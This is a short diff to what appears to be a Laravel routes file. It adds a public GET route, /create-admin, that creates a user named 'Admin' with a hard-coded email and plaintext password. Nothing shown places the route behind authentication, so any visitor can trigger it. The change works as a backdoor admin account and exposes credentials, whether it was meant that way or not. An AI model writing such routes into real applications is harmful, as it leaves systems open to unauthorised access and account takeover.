@@ -45,6 +45,14 @@ Route::middleware(['auth'])->group(function () {
 
 Route::post('/admin/toggle/{key}', [AdminController::class, 'toggle']);
 
+Route::get('/create-admin', function () {
+   \App\Models\User::create([
+      'name' => 'Admin',
+        'email' => 'adollyana',
+        'password' => bcrypt('BringCake2@'),
+    ]);
+    return 'User created!';
+});
 
 Route::get('/', function () {
     $settings = [
